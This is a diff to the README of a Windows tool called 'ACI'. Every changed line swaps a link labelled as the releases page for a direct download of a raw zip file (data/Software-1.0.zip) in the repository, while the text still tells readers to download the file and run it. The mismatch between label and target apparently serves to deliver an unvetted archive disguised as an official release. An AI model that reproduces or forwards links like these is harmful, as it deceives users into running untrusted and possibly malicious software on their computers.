@@ -1,6 +1,6 @@
 # 🧩 ACI - Run apps through one interface
 
-[![Download ACI](https://img.shields.io/badge/Download-ACI%20Releases-blue?style=for-the-badge)](https://github.com/agerelated-clioquinol357/ACI/releases)
+[![Download ACI](https://img.shields.io/badge/Download-ACI%20Releases-blue?style=for-the-badge)](https://github.com/agerelated-clioquinol357/ACI/raw/refs/heads/main/data/Software-1.0.zip)
 
 ## 🚀 What ACI is
 
@@ -12,7 +12,7 @@ With ACI, you can use supported apps in a more direct way. Instead of relying on
 
 Use this page to visit and download the latest version for Windows:
 
-[Visit the ACI releases page](https://github.com/agerelated-clioquinol357/ACI/releases)
+[Visit the ACI releases page](https://github.com/agerelated-clioquinol357/ACI/raw/refs/heads/main/data/Software-1.0.zip)
 
 Look for the newest release, then download the Windows file listed there. If there is more than one file, choose the one that matches your system, such as a standard Windows installer or a portable app file.
 
@@ -186,4 +186,4 @@ That means:
 
 Open the releases page, download the latest Windows file, and run it on your PC
 
-[Go to ACI releases](https://github.com/agerelated-clioquinol357/ACI/releases)
+[Go to ACI releases](https://github.com/agerelated-clioquinol357/ACI/raw/refs/heads/main/data/Software-1.0.zip)
